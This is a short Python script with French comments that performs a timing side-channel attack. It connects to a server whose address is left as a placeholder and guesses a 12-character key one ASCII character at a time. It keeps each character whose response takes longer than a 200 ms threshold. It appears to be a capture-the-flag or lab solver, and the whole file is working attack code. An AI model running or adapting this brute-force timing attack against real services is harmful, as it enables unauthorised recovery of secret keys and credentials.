#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import time


ip = 'your_serv' #param connexion
port = your_port

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))

result="" #ici une clé que l'on cherche a obtenir 
while(len(result)<12): # ici la clé fait 12 bit, modifier ce param à votre guise
	for i in range(32,123): #on teste tout les caractère de la table ascii entre 32(#) et 122 (z)
		t = "%s%s" % (result,str(chr(i))) #on envoie caractere par caractere
		s.send(t)
		t1 = time.time() #demarage timer
		r = s.recv(512) #on recupere la rep serveur
		t2= time.time() # fin timer 
		dt = (t2-t1)*1000 #on passe en ms
		print("sending %s,resp = %d" % (t,dt)) #si le serveur est "plus long" a répondre que les autres caractère, alors ce caractère est bon
		if dt>200: #ici le test vaut 200ms, modifier le en fonction de la réponse du serveur
			result += chr(i) #on ajoute le caractère a la clé
			print("key : %s" % result)
			break



